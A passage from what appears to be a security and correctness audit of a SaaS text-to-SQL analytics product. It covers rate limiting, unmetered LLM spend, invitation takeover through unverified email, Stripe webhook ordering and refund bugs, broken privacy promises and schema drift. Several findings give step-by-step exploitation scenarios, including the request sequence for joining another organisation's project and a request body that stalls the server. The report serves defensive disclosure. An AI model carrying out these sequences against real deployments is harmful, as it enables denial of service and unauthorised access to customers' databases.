- **Concrete failure**: `POST /api/visualizations/export` with `{"columns":[20 names],"rows":[10 000 rows of 20 strings],"format":"xlsx"}` — a 3.3 MB body, well under `max_request_body_bytes` = 10 MB (`config.py:952`) and one fifth of the declared row cap — returns after **102 s**, during which the dyno serves nothing else. The rate limit is 20/minute, so one authenticated caller can hold the loop continuously.
- **Evidence** — measured on this machine with the repo's own venv (a dyno core is slower):
```
rows=1000   body_bytes=309971    export_xlsx_seconds=3.51
rows=5000   body_bytes=1637971   export_xlsx_seconds=38.10
rows=10000  body_bytes=3297971   export_xlsx_seconds=102.42
```
Isolating the cause at 3 000 rows × 20 columns: `ws.append` alone **0.09 s**; `ws.append` + `for cell in ws[ws.max_row]` **5.67 s** — 63×. The cost is the per-row re-index, not the XLSX writing.
- **Severity**: high — a single ordinary request denies service to the whole web process and can trigger a spurious stale-run reap.
- **Confidence**: certain — measured, twice, with the isolating control.

---

## API-05 — The rate limiter is keyed on `request.client.host`, which behind Heroku's router is the same address for every caller

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/core/rate_limit.py:38-43`, `Procfile:1`
- **What is wrong**: `Limiter(key_func=get_remote_address, ...)`; slowapi's `get_remote_address` returns `request.client.host` verbatim (`slowapi/util.py:20-27`). Uvicorn's `ProxyHeadersMiddleware` only rewrites `scope["client"]` from `X-Forwarded-For` when the peer is in `trusted_hosts` (`uvicorn/middleware/proxy_headers.py:34`), and `forwarded_allow_ips` defaults to `"127.0.0.1"` (`uvicorn/config.py:355-356`). The `Procfile` starts uvicorn with only `--host` and `--port`, `FORWARDED_ALLOW_IPS` appears **nowhere** in the repository (`grep -rn FORWARDED_ALLOW_IPS` excluding `.venv`/`.git` → no matches), and `main.py` installs no proxy-header middleware of its own (`main.py:502-510`). The Heroku router is not `127.0.0.1` to the dyno, so `X-Forwarded-For` is ignored and every request presents the same client host.
- **Concrete failure**: `POST /api/auth/register` is limited `5/minute`. With one shared key, the sixth registration attempt **from any user anywhere in the world** in a given minute gets `429`. Symmetrically, `POST /api/chat/ask` at `20/minute` becomes a global 20/minute across the entire tenant base — and per-user abuse becomes indistinguishable from normal load. The limit is neither per-IP (as `API.md:633` claims) nor per-user.
- **Evidence**:
```python
# app/core/rate_limit.py:38-43
limiter = Limiter(
    key_func=get_remote_address,        # -> request.client.host
    default_limits=["60/minute"],
    ...)
# Procfile:1
web: cd backend && alembic upgrade head && uvicorn app.main:app --host 0.0.0.0 --port ${PORT:-8000}
```
- **Severity**: high — every rate limit in the product is either globally shared (a denial-of-service on legitimate users) or, if `FORWARDED_ALLOW_IPS=*` were set instead, keyed on a header the caller writes.
- **Confidence**: likely. What would settle it: `heroku config:get FORWARDED_ALLOW_IPS` (expected empty), or log `request.client.host` for two requests from different networks and check whether the values differ.

---

## API-08 — Four routes spend LLM tokens through a bare `LLMRouter()`, so the spend is neither budget-checked nor recorded

*`API` — HTTP routes and contracts*

- **Where**: `backend/app/api/routes/chat_utility.py:366` and `:506`, `backend/app/api/routes/chat_sessions.py:193`, `backend/app/api/routes/chat.py:743`
- **What is wrong**: `LLMRouter.__init__` defaults `self._sink = usage_sink or NullUsageSink()` (`app/llm/router.py:103-108`), and `NullUsageSink.observe` is a no-op (`app/llm/usage_sink.py:71-78`). The codebase names this exact hazard at `data_investigations.py:408-410`: *"A bare `LLMRouter()` has a `NullUsageSink`, which is exactly the off-the-books path we must avoid; bind a `DbUsageSink` whenever we know who to attribute the spend to."* Four HTTP handlers still construct a bare one, and all four have `user["user_id"]` and `project_id` in scope. None of them calls `check_token_budget` either — the gate exists only in `chat.py:275`, `chat.py:646`, `chat.py:1705`, `chat_feedback.py:453` and the MCP surface (`mcp_server/tools.py:285`).
- **Concrete failure**: `POST /api/chat/summarize {"project_id":"p1","message_id":"m1"}` in a loop at its 20/minute limit. Each call completes an LLM request. `GET /api/usage/stats` and `GET /api/billing/subscription` show zero additional tokens, `check_budget` never trips, and an account whose daily ceiling is already exhausted continues to spend. The same holds for `POST /api/chat/explain-sql`, `POST /api/chat/sessions/{id}/generate-title`, and the session-rotation summariser fired inside `POST /api/chat/ask/stream` (`chat.py:743`), which runs *after* the budget check at `:646` and is therefore unmetered even on the metered path.
- **Evidence**:
```python
# chat_utility.py:366 (POST /api/chat/summarize is :506, identical shape)
llm_router = LLMRouter()          # -> NullUsageSink; no usage_sink=, no budget check
# app/llm/router.py:108
self._sink: UsageSink = usage_sink or NullUsageSink()
```
- **Severity**: high — with `billing_enabled` on, this is revenue leaving unbilled and a plan ceiling that four routes can walk around.
- **Confidence**: certain — the four call sites and the default are quoted; the codebase's own comment names the consequence.

---

## AUTH-01 — An unverified email/password account can accept another person's project invitation, defeating the F-PROJ-01 verification gate

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/services/invite_service.py:221-228` (the check), reached from `backend/app/api/routes/invites.py:223-229`; the invite id is handed out by `backend/app/api/routes/invites.py:271-276`
- **What is wrong**: `accept_invite` proves the caller's *stored* email string equals the invite's, but never that the caller ever proved ownership of that address (`User.email_verified`). Registration issues a live session immediately (`auth.py:149-152`) with `email_verified=False`, and the *only* `email_verified` gate anywhere in the API is project **creation** (`app/api/routes/projects.py:157` — the sole non-auth.py hit for that column). `auth.py:132-134` states the intended rule in a comment — "an email/password registration is NOT proof the registrant owns the address, so we do NOT auto-accept email-based invites here" — and then leaves the interactive route with no such check, so the protection exists only on the path nobody attacks.
- **Concrete failure**: An owner invites `newhire@corp.com`, who has no account yet. An attacker `POST /api/auth/register` with `newhire@corp.com` and a password of their choosing — 200, session cookie set, `email_verified:false`. They call `GET /api/invites/pending`, which filters only on `user["email"]` and returns the invite id, role and project name. They call `POST /api/invites/accept/{invite_id}` → 200 `{"role":"editor"}`. They are now a project member and can list connections, read the indexed schema, read chat history and ask questions against the customer's production database. The real owner of the address can never register (409, email taken).
- **Evidence**:
```python
# app/services/invite_service.py:221-228
        if not _skip_email_check:
            user_result = await db.execute(select(User).where(User.id == user_id))
            user_obj = user_result.scalar_one_or_none()
            if not user_obj or user_obj.email.lower().strip() != invite.email.lower().strip():
                raise HTTPException(
                    status_code=403,
                    detail="This invite is for a different email address",
                )
```
```
$ grep -rn "email_verified" app --include="*.py" | grep -v "auth.py\|auth_service.py\|models/user.py"
app/api/routes/projects.py:157:        if user_obj is not None and not user_obj.email_verified:
```
- **Severity**: high — unauthenticated-to-tenant-member escalation reaching another organisation's database through a normal, documented flow.
- **Confidence**: certain. The code path is complete and reachable; the only variable is whether an invite is outstanding for an address with no account, which is the ordinary case for a first invite.

---

## AUTH-03 — `list_sessions` and `validate_session_access` treat a NULL owner as "belongs to whoever is asking", so ownerless sessions are listed to and writable by every project member

*`AUTH` — Authentication, tenancy, access control*

- **Where**: `backend/app/services/chat_service.py:166` (`list_sessions`), `:287` (`ensure_welcome` count), `:347` (`validate_session_access`)
- **What is wrong**: Two of these explicitly `OR` the NULL-owner rows into a user-scoped query, and the third repeats AUTH-02's falsy short-circuit. Where AUTH-02 is a missing check, this is an affirmative decision to widen the filter — the exact union that `ssh_key_service.py:71-76` and `vendor_credential_service.py:158-165` both refuse, with the reason written out ("that would show one user's vendor key to every other user"). `validate_session_access` is what `POST /api/chat/ask` (`chat.py:288`) and `POST /api/chat/ask/stream` (`chat.py:658`) use to decide whether the caller may continue an existing session.
- **Concrete failure**: A departed colleague's sessions in project P are ownerless (see AUTH-02). Every remaining member of P calls `GET /api/chat/sessions/{project_id}` and the list comes back containing those sessions — ids, titles, timestamps — which they then read in full and, via `POST /api/chat/ask` with that `session_id`, append their own turns to, so the departed user's history and the new turns are interleaved in one persisted transcript. It also hands the ids that make AUTH-02 exploitable to anyone who was ever in the project.
- **Evidence**:
```python
# app/services/chat_service.py:163-166
        stmt = select(ChatSession).where(ChatSession.project_id == project_id)
        if user_id:
            stmt = stmt.where((ChatSession.user_id == user_id) | (ChatSession.user_id.is_(None)))

# app/services/chat_service.py:345-348
        if chat.project_id != project_id:
            return None
        if chat.user_id and chat.user_id != user_id:
            return None
```
- **Severity**: high — intra-project disclosure of another person's chat history plus write access to it; also the delivery mechanism for AUTH-02's session ids.
- **Confidence**: certain.

---

## BILL-03 — A refund or chargeback whose reversal fails is committed to the idempotency ledger as processed; the exact reasoning `_credit_top_up` was corrected for is still in place for money going out

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/billing_service.py:646-654` and `:693-701`, committed by `:478`
- **What is wrong**: `_charge_owner` catches every exception from `Charge.retrieve` and returns `None`; `_reverse_purchased_credit` catches every exception from `debit()` and returns. Both merely log. Control returns to `handle_event`, which falls through to `await db.commit()` at `:478`, permanently persisting the `StripeEvent` row for that event id. Stripe will never redeliver it, and `reconcile()` iterates `Subscription` rows only (`:494-502`) so no sweep can find a top-up reversal that did not happen. `_credit_top_up`'s docstring at `:755-762` already dismantles this reasoning for grants — "Retrying the *webhook* does not retry the *charge* — it redelivers the event, which is exactly what a failed grant needs" — and `_charge_owner:649-650` still carries the refuted version verbatim.
- **Concrete failure**: A customer buys $500 of LLM credit, spends none, and requests a refund. Stripe emits `refund.created` with `amount: 50000`. `Charge.retrieve` times out (the call is unwrapped and blocking, see BILL-07 — a 15 s stall on the event loop is enough). `_charge_owner` logs `REVERSAL NOT APPLIED` and returns `None`; the ledger row commits; the webhook answers `200 {"received": true}`. The customer has their $500 back and $500 of purchased credit still on the books, which the next `provision`/`top_up` will fold into their OpenRouter ceiling.
- **Evidence**:
  ```python
  # app/services/billing_service.py:646-654
  try:
      charge = _stripe().Charge.retrieve(charge_id)
  except Exception:
      # Never raise: the money has already moved, and a failed webhook makes Stripe
      # retry something that cannot be un-done. A human has to finish it.
      logger.error("billing: REVERSAL NOT APPLIED — could not read charge %s", ...)
      return None
  ```
- **Severity**: high — asymmetric in the customer's favour on the one path that takes money back, and self-concealing: the ledger asserts the event was handled.
- **Confidence**: certain. The commit at `:478` is outside the `try`, and only `_apply_event` raising would roll it back.

---

## BILL-04 — Subscription events are applied with no ordering guard, so an out-of-order `updated` after `deleted` resurrects a cancelled account and mints it a fresh spending key

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/billing_service.py:826-882` (`_sync_subscription`), specifically `:850-851` and `:876-882`
- **What is wrong**: `_sync_subscription` writes whatever the payload says, unconditionally. There is no comparison against `event.created`, no subscription-object version check, no "is this older than what we already stored" test — `grep -n "created\|version\|timestamp" app/services/billing_service.py` returns only comments and `_HANDLED_EVENTS` entries. Stripe does not guarantee delivery order. The `deleted` branch is a full teardown (`status="canceled"`, `plan_id="free"`, `stripe_subscription_id=None`, `_revoke_key`), and any later-arriving `customer.subscription.updated` re-applies the whole live state on top of it — including `_provision_key`, which mints a *new* OpenRouter key because `revoke` cleared `key_hash` and `key_encrypted` (`openrouter_credit_service.py:304-305`), so `provision`'s idempotency early-return at `:102` no longer fires.
- **Concrete failure**: A customer cancels immediately. Stripe emits `customer.subscription.updated` (`status: "active"`, `cancel_at_period_end: true`) at T and `customer.subscription.deleted` at T+1s. Delivery arrives reversed. Processing `deleted` first revokes the key and drops the row to `free`/`canceled`. Processing the stale `updated` second sets `stripe_subscription_id` back, `status = "active"`, and calls `_provision_key` with `included_usd = 30.0` — a brand-new key with a $30 ceiling for an account that cancelled. `reconcile()` will eventually correct `status` (`:530-539`) but it never calls `_revoke_key`, so the key survives indefinitely.
- **Evidence**:
  ```python
  # app/services/billing_service.py:838-848 / 850-851 / 876-882
  if deleted:
      sub.status = "canceled"; sub.plan_id = "free"; sub.stripe_subscription_id = None
      await self._revoke_key(db, sub.user_id)
      return
  sub.stripe_subscription_id = obj.get("id")
  sub.status = obj.get("status") or sub.status
  ...
  if sub.status in _LIVE_SUBSCRIPTION_STATUSES:
      await self._provision_key(db, sub.user_id, included_usd=_included_credit_for(plan))
  ```
- **Severity**: high — a cancelled account holding a live, funded spending key, and the repair sweep cannot see it.
- **Confidence**: likely. Settled by adding an event-ordering assertion: store `event["created"]` (or the subscription's own `updated`) alongside the row and replay `deleted` then a stale `updated` against the current code.

---

## BILL-05 — The duplicate-subscription guard reads a field only the webhook writes, so two concurrent checkouts both pass and the second Stripe subscription silently overwrites the first

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/billing_service.py:203-211` and `:253-266` (`_active_subscription_id`)
- **What is wrong**: The guard is explicitly there to stop a second charge — "Guard the duplicate BEFORE the money moves. A second active subscription for one account is a refund conversation, and by the time the webhook could notice it the card has already been charged." But it reads `Subscription.stripe_subscription_id`, which is `NULL` until `_sync_subscription` runs on a webhook that lands minutes after Checkout is created. Check-then-act with a window measured in minutes, and no reservation is taken when the session is created. `Subscription` is one row per user (`models/billing.py:66-72`), so the second `_sync_subscription` overwrites `stripe_subscription_id` at `:850` and the first subscription becomes unreferenced.
- **Concrete failure**: A customer opens `/pricing` in two tabs and completes both. Session A and session B are both created (`_active_subscription_id` returns `None` for both — the rate limit is 10/minute, `billing.py:97`). Both cards clear; Stripe creates `sub_A` and `sub_B`. The row ends up holding `sub_B`. `sub_A` bills $199/month forever, appears in no row of the database, and `reconcile()` cannot find it because that sweep iterates *our* rows (`:494-502`). The customer is charged $398/month; the only surface that shows both is Stripe's dashboard.
- **Evidence**:
  ```python
  # app/services/billing_service.py:259-266
  sub = (await db.execute(select(Subscription).where(...))).scalar_one_or_none()
  if sub is None or not sub.stripe_subscription_id:
      return None                              # <- the whole pre-webhook window
  return sub.stripe_subscription_id if sub.status in ("active","trialing","past_due") else None
  ```
- **Severity**: high — a double charge, and the extra subscription is invisible to every internal view including the reconciliation sweep that exists to catch exactly this class of drift.
- **Confidence**: likely. Settled by whether Stripe's account settings forbid multiple subscriptions per customer for the same price; by default they do not.

---

## BILL-08 — A renewal that fails is committed as processed, and the *next* renewal then debits purchased credit for spend the included allowance already covered

*`BILL` — Billing, subscriptions, LLM credit*

- **Where**: `backend/app/services/billing_service.py:815-824`, arithmetic at `backend/app/services/openrouter_credit_service.py:265-272`
- **What is wrong**: `_renew_credit` swallows every exception at `:819` and logs at WARNING. `handle_event` then commits the `StripeEvent` row, so Stripe never redelivers. The consequence is not just a skipped grant: `renew()` computes `spent = usage − usage_at_period_start` and charges `max(0, spent − included_grant_usd)` to the purchased pocket. When a renewal is missed, `usage_at_period_start` is not advanced, so at the *next* renewal `spent` spans two periods while `included_grant_usd` covers one.
- **Concrete failure**: `base`, $30/month included, customer holds $50 purchased. Month 1: they spend exactly $30 — all included, purchased untouched. The `invoice.paid` webhook's `renew()` call raises (OpenRouter 502; `_call` at `:60` turns any ≥400 into `CreditError`). It is logged, swallowed, ledger committed. Month 2: they spend another $30. `invoice.paid` fires, `renew()` succeeds — `usage = 60`, `usage_at_period_start = 0`, `spent = 60`, `_split(60, 30)` → `from_purchased = 30`. `purchased_balance_usd` drops $50 → $20. **$30 of credit the customer bought is destroyed** to pay for consumption their included allowance had already covered — the precise failure `_split`'s own test names as "indistinguishable from theft" (`test_openrouter_credit_ledger.py:50-58`).
- **Evidence**:
  ```python
  # app/services/billing_service.py:815-824
  try:
      await OpenRouterCreditService().renew(db, sub.user_id, included_usd=included)
  except Exception:
      logger.warning("billing: could not roll the credit period for user=%s", ...)
  ```
  ```python
  # app/services/openrouter_credit_service.py:267-270
  spent = max(Decimal(0), usage - _q(row.usage_at_period_start))
  _, from_purchased = self._split(spent, _q(row.included_grant_usd))
  row.purchased_balance_usd = max(Decimal(0), _q(row.purchased_balance_usd) - from_purchased)
  ```
- **Severity**: high — silent destruction of credit the customer paid for, caused by one transient third-party error that is logged at WARNING.
- **Confidence**: certain for the swallow-then-commit; certain for the arithmetic given a missed period.

---

## BIZ-02 — `team` and `enterprise` are absent from the included-credit table, so their advertised LLM credit provisions as $0

*`BIZ` — Business logic vs stated promises*

- **The promise**: `backend/app/services/plan_catalogue.py:103-106` — Team, $900/month: `"10 projects, 50 data sources, 5 GB index per project, $150/month of LLM credit at cost."`
- **Where the code differs**: `backend/app/services/billing_service.py:116`
- **What is wrong**: `_INCLUDED_CREDIT_USD` has two entries. `_included_credit_for` (`:119-121`) returns `0.0` for any id not in it, and `provision` computes `limit = _q(included_usd) + _q(row.purchased_balance_usd)` (`openrouter_credit_service.py:107`) — `0.0 + 0` for a fresh Team row — and sends that to OpenRouter as the key's lifetime ceiling. The docstring at `billing_service.py:110-115` says the figure "Scales with the tier because a Scale customer runs three projects and fifteen data sources and will burn more", which shows the table was written while only two tiers existed and never extended.
- **Concrete failure**: A customer buys Team at $900/month expecting $150 of monthly LLM credit. The webhook provisions their key with `limit: 0.0`. Today the consequence is masked by BIZ-01 (nothing uses the key); the day BIZ-01 is fixed, Team and Enterprise become the two tiers that cannot make an LLM call at all — the two most expensive ones.
- **Evidence**:
```python
# backend/app/services/billing_service.py:116
_INCLUDED_CREDIT_USD: dict[str, float] = {"base": 30.0, "scale": 90.0}

# backend/app/services/billing_service.py:119-121
def _included_credit_for(plan) -> float:
    """The tier's monthly credit, or 0 for a tier that includes none."""
    return _INCLUDED_CREDIT_USD.get(getattr(plan, "id", "") or "", 0.0)
```
- **Severity**: **high** — a stated, priced entitlement resolves to zero for the top two tiers, and it is a latent outage behind the BIZ-01 fix.
- **Confidence**: certain for `team` (its description names $150). For `enterprise` the description says "LLM credit at cost with no monthly cap", so `0` may be intended as *uncapped* — but `provision` reads `0` as a $0 ceiling, not as unlimited, so the ambiguity itself is the defect. Settled by deciding what `0` means in `_limit_for`.

---

## BIZ-04 — Deleting an account does not delete the user's chats in projects they do not own, and the `SET NULL` widens who can read them

*`BIZ` — Business logic vs stated promises*

- **The promise**: `frontend/src/app/(marketing)/privacy/page.tsx:374-378` — *"Upon account deletion, all data associated with your account is permanently removed."* Reinforced at `:348-350`: chat history is *"retained until you delete individual sessions or your entire account"*.
- **Where the code differs**: `backend/app/api/routes/auth.py:466` and `:512`; `backend/app/models/chat_session.py:24-29`; `backend/app/api/routes/chat_sessions.py:133`; `backend/app/services/chat_service.py:165`
- **What is wrong**: `delete_account` enumerates and deletes only projects where `Project.owner_id == user_id`, then deletes the `User` row. `ChatSession.user_id` is `ForeignKey("users.id", ondelete="SET NULL")`, so sessions the user created inside *someone else's* project survive with `user_id = NULL` and all their `chat_messages` intact — including `metadata_json`, which carries the question, the generated SQL and up to 500 result rows (`chat.py:477-486`). Worse, the guard is `if session_obj.user_id and session_obj.user_id != user_id`, so a `NULL` short-circuits it, and `list_sessions` explicitly ORs in `user_id.is_(None)`. Deletion therefore converts private sessions into sessions every project member can list and read.
- **Concrete failure**: An analyst is invited as `editor` to a colleague's project, asks questions against the production database for three months, then exercises their GDPR erasure right and deletes their account. Every one of those sessions — their questions and up to 500 rows per answer of production data — remains in `chat_messages`, and now appears in the sidebar of every other member of that project, who can open it via `GET /api/chat/sessions/{id}/messages`.
- **Evidence**:
```python
# backend/app/api/routes/auth.py:449-451, 466
    owned_ids = (
        (await db.execute(select(Project.id).where(Project.owner_id == user_id))).scalars().all()
    )
            await db.execute(delete(Project).where(Project.id.in_(owned_ids)))

# backend/app/api/routes/chat_sessions.py:133
    if session_obj.user_id and session_obj.user_id != user_id:
        raise HTTPException(status_code=403, detail="Not your session")

# backend/app/services/chat_service.py:165
            stmt = stmt.where((ChatSession.user_id == user_id) | (ChatSession.user_id.is_(None)))
```
- **Severity**: **high** — an explicit erasure promise on a legal page, in a product whose primary sales objection is data handling; the widened visibility makes deletion actively harmful.
- **Confidence**: certain for the survival and the `NULL`-passes-guard behaviour. `needs-verification` only on whether any non-deletion path also produces `user_id = NULL` sessions; a query for `SELECT count(*) FROM chat_sessions WHERE user_id IS NULL` on production would size the existing exposure.

---

## BIZ-05 — Invariant 4 ("learning is per-connection") is enforced for learnings and broken for insights: they are stored per-connection and injected project-wide

*`BIZ` — Business logic vs stated promises*

- **The promise**: `vision.md:73` — *"**Learning is per-connection, not global** — knowledge about one database never leaks into or corrupts queries against another"*
- **Where the code differs**: `backend/app/agents/orchestrator.py:1137` and `backend/app/agents/orchestrator.py:2416`
- **What is wrong**: `InsightMemoryService.store_insight` is called with `connection_id=conn_id` (`sql_agent.py:1188`), the column exists (`models/insight_record.py:21-23`), and `get_insights` supports filtering on it (`core/insight_memory.py:156, 165-166`). But the injection into the orchestrator prompt calls `load_relevant_insights(context.project_id)` with no connection — and `ContextLoader.load_relevant_insights` (`context_loader.py:345-388`) has no `connection_id` parameter at all. Eight lines below the call site, `orchestrator.py:1145-1147` reads `context.connection_config.connection_id` for the knowledge pack, proving the value is in hand. `_find_duplicate` (`insight_memory.py`, the `store_insight` dedup) likewise ignores `connection_id`, so an anomaly found on connection A can silently absorb one found on connection B.
- **Concrete failure**: A `team`-tier project holds 50 data sources. The agent detects on the ClickHouse events store that `revenue` is stored in minor units and records an insight with `recommended_action: "divide by 100"`. The next question is asked against the MongoDB billing store, where amounts are already in major units. `load_relevant_insights` injects `[warning] [anomaly] revenue is in minor units → divide by 100` into that prompt. The answer is wrong by a factor of 100 and the trace shows no SQL error.
- **Evidence**:
```python
# backend/app/agents/orchestrator.py:1136-1137, 1145-1147
        recent_learnings = await self._ctx_loader.load_recent_learnings(context)
        active_insights = await self._ctx_loader.load_relevant_insights(context.project_id)
            conn_id_for_pack = (
                context.connection_config.connection_id if context.connection_config else None
            )

# backend/app/core/insight_memory.py:156, 165-166  (the filter that exists and is never used)
        connection_id: str | None = None,
        if connection_id:
            stmt = stmt.where(InsightRecord.connection_id == connection_id)
```
- **Severity**: **high** — this is one of the seven invariants `vision.md` calls load-bearing, and the failure mode is a silently wrong number, which is the exact harm the product is sold to prevent.
- **Confidence**: certain that the scoping is dropped. `needs-verification` on real-world blast radius: `SELECT connection_id, count(*) FROM insight_records WHERE status='active' GROUP BY 1` on a multi-connection project would show whether cross-contamination is already live.

---

## BIZ-06 — Invariant 6 ("user feedback is the highest authority") has no investigation behind it: the entire InvestigationAgent user surface is unreachable code

*`BIZ` — Business logic vs stated promises*

- **The promise**: `vision.md:75` — *"**User feedback is the highest authority** — when a user says the data is wrong, **the system investigates**, learns, and adjusts"*. Restated as shipped behaviour in `docs/ux/scenarios.md:1127` (SCN-052, `Status: implemented`, `2026-07-19 PASS`): *"negative SQL feedback triggers a 'wrong data' investigation"*.
- **Where the code differs**: `frontend/src/components/chat/WrongDataModal.tsx:30`; `frontend/src/components/chat/ChatMessage.tsx:237-241`
- **What is wrong**: The backend carries a complete investigation subsystem — `InvestigationAgent`, a `DataInvestigation` model, `POST /api/data-validation/investigate`, `GET .../investigate/{id}`, `POST .../investigate/{id}/confirm-fix`, and a confirmed-root-cause path that mints a 0.9-confidence learning. The only frontend caller of any of it is `WrongDataModal`, whose six complaint types and progress view are the designed UX. `grep -rn "WrongDataModal" frontend/src/` returns three hits, all inside the file itself: it is never imported or rendered. What thumbs-down actually does is post a rating, fire a parallel `validate-data` rejection, and **send a canned English sentence into the ordinary chat loop** — an LLM turn through the same orchestrator that produced the wrong answer, with no `DataInvestigation` row and no root-cause classification.
- **Concrete failure**: A user sees a wrong revenue figure and clicks thumbs-down. They expect the system to investigate. Instead a message appears in their own transcript — "I flagged the previous query result as incorrect. Please investigate…" — and the same agent re-answers, frequently reproducing the same error. No investigation record exists, so nothing can be reviewed later, and the 0.9-confidence corrective learning that `confirm_investigation_fix` exists to create can never be reached by any user.
- **Evidence**:
```
$ grep -rn "WrongDataModal" frontend/src/
frontend/src/components/chat/WrongDataModal.tsx:20:interface WrongDataModalProps {
frontend/src/components/chat/WrongDataModal.tsx:30:export function WrongDataModal({
frontend/src/components/chat/WrongDataModal.tsx:36:}: WrongDataModalProps) {
```
```tsx
// frontend/src/components/chat/ChatMessage.tsx:237-241
      if (rating === -1 && isSqlResult && onSendMessage) {
        onSendMessage(
          "I flagged the previous query result as incorrect. Please investigate what might be wrong and suggest a corrected query."
        );
      }
```
- **Severity**: **high** — a named invariant, a scenario stamped `implemented / PASS`, and an entire backend subsystem with no way in. This is also the clearest instance of finding-type 4: dead product surface behind a paid tier.
- **Confidence**: certain.

---

## BIZ-07 — Invariant 3 ("every answer is traceable") holds for the three chat transports and fails for MCP, for two abort paths, and for every user who is not the project owner

*`BIZ` — Business logic vs stated promises*

- **The promise**: `vision.md:72` — *"**Every answer is traceable** — the SQL query, attempt history, data sources, and reasoning are **always** available for inspection"*
- **Where the code differs**: `backend/app/mcp_server/tools.py:539-575`; `backend/app/api/routes/logs.py:189` and `:215`
- **What is wrong**: Three independent gaps. (a) `execute_raw_query` runs arbitrary SQL against the customer's database and returns rows with no `ChatMessage`, no trace, and no `audit_logs` row — zero record that it happened. (b) Attempt history is written only to `query_failures.attempts_json`, and both read endpoints call `require_role(..., "owner")`; there is no filter on `message_id` even though the column is stored (`models/query_failure.py:33`). So an `editor` or `viewer` — the personas `scenarios.md:212-217` defines as the people who ask questions — cannot inspect the attempt history of any answer, and nobody can inspect it for a *specific* answer. (c) A clean run stores no attempt record at all (`services/query_failure_service.py:167-170`), so "attempt history" exists only for failures.
- **Concrete failure**: An analyst (role `editor`) gets a number they distrust and wants to see how the agent arrived at it — which queries it tried, which were rejected by the validation loop. `GET /api/logs/{project_id}/query-failures` returns 403. Separately, an operator auditing what an MCP-connected agent did against the production database finds nothing: `execute_raw_query` leaves no row anywhere.
- **Evidence**:
```python
# backend/app/api/routes/logs.py:188-189
    """Paginated list of captured query failures (owner-only)."""
    await _membership_svc.require_role(db, project_id, user["user_id"], "owner")

# backend/app/mcp_server/tools.py:568-575 — executes and returns; no tracker, no message, no audit
        try:
            result = await connector.execute_query(query)
        finally:
            await connector.disconnect()
    ...
    return _format_query_result(result)
```
- **Severity**: **high** — "always available for inspection" is false for the role that does the asking, and an entire authenticated query surface is unauditable.
- **Confidence**: certain.

---

## DATA-02 — 81 columns are `NOT NULL` in the model and nullable in the schema the migrations build, so the test schema is stricter than production

*`DATA` — Data model and migrations*

- **Where**: 19 tables. Worst: `backend/app/models/insight_record.py:26-53` (13 columns) vs `backend/alembic/versions/f1b2c3d4e5f6_add_data_graph_and_insight_tables.py:95-133`; `backend/app/models/metric_definition.py` (13); `insight_record.py:66-76` → `trust_scores` (9); `data_validation.py` (7+4); `benchmark.py` (6); `session_note.py` (5).
- **What is wrong**: `Mapped[str]` / `Mapped[int]` without `| None` makes SQLAlchemy infer `nullable=False`, and the models rely on that inference throughout. The migrations that created these tables passed `server_default=…` but no `nullable=False`. The 2026-03 hardening pass (`5f9fe870b98c`) closed the gap for 18 tables and stopped there; every table created after it, and every table it skipped, still diverges. Because tests build their schema with `Base.metadata.create_all` (`backend/tests/integration/conftest.py:75`) and production builds it with Alembic, the two schemas are not the same schema.
- **Concrete failure**: `insight_records.severity`. The model (`insight_record.py:26`) declares `Mapped[str] = mapped_column(String(20), default="info")` → `NOT NULL`. Production accepts `UPDATE insight_records SET severity = NULL`; the integration test suite rejects the same statement. Any code path that writes NULL — a Core `update()`, a backfill, a support fix — is caught in CI on exactly the tables where it is not caught in production, and vice versa. The mirror cost is that a future `alembic revision --autogenerate` will emit 81 `ALTER TABLE … ALTER COLUMN … SET NOT NULL` statements, each an `ACCESS EXCLUSIVE` lock plus a full scan on a Postgres table.
- **Evidence** — model declaration vs migration, same column:

```
insight_record.py:26   severity: Mapped[str] = mapped_column(String(20), default="info")
f1b2c3d4e5f6.py:113    sa.Column("severity", sa.String(20), server_default="info"),
```
  Full count, from the migration-built database compared to `Base.metadata`:
```
 13  insight_records      7  metric_relationships    2  learning_votes
 13  metric_definitions   6  data_benchmarks         2  notifications
  9  trust_scores         5  session_notes           1  db_index
  7  data_investigations  4  data_validation_feedback …
tables: 19  columns: 81
```
  All 81 do carry a server default in the database, so no NULL is present today — this is a divergence of *enforcement*, not of current data.
- **Severity**: high — not because a NULL exists now, but because the schema CI exercises is provably not the schema production runs, across a fifth of the tables.
- **Confidence**: certain for the divergence (mechanically enumerated). Whether any NULL exists in production needs `SELECT count(*) … WHERE severity IS NULL` on each column to settle.

---

## DATA-03 — `db_index.row_count` is a 32-bit `Integer` fed directly from `reltuples::bigint` and ClickHouse `total_rows` (UInt64)

*`DATA` — Data model and migrations*

- **Where**: `backend/app/models/db_index.py:30`; `backend/alembic/versions/i4j5k6l7m8n9_add_db_index_tables.py:33`; producers `backend/app/connectors/postgres.py:305` and `:507`, `backend/app/connectors/clickhouse.py:263` and `:348`; consumer `backend/app/knowledge/db_index_pipeline.py:1051`
- **What is wrong**: the connectors deliberately widen the vendor's row estimate to 64 bits when reading it, and the column that stores it is `INTEGER` — signed 32-bit on PostgreSQL, max 2 147 483 647. Nothing clamps in between: `_normalize_reltuples` (`postgres.py:76-93`) only maps negatives to `None`, and the ClickHouse path passes `trow_count` through untouched.
- **Concrete failure**: indexing a ClickHouse connection holding an events table with 3 000 000 000 rows. `system.tables.total_rows` returns 3e9, `TableInfo.row_count` carries it, `db_index_pipeline.py:1051` puts it in `table_data["row_count"]`, and the upsert into `db_index` raises `asyncpg.exceptions.NumericValueOutOfRange: value "3000000000" is out of range for type integer`. The failure lands inside the `analyze_tables` step, so the whole DB-index run for that connection fails — for one oversized table, on a product that markets ClickHouse support.
- **Evidence**:

```
app/models/db_index.py:30        row_count: Mapped[int | None] = mapped_column(Integer, nullable=True)
alembic/…/i4j5k6l7m8n9.py:33     sa.Column("row_count", sa.Integer, nullable=True),
app/connectors/postgres.py:305          c.reltuples::bigint AS approx_rows,
app/connectors/clickhouse.py:263  "SELECT name, comment, total_rows, sorting_key, primary_key, engine "
app/connectors/clickhouse.py:348          row_count=trow_count,
```
  Every other large counter in the schema is already `BigInteger` (`app/models/analytics_ga4.py:59`, `app/models/billing.py:50`), so the type choice here is an oversight rather than a decision.
- **Severity**: high — one customer table over 2.1B rows breaks schema indexing for the entire connection, and the error surfaces as a driver exception with no mention of which table caused it.
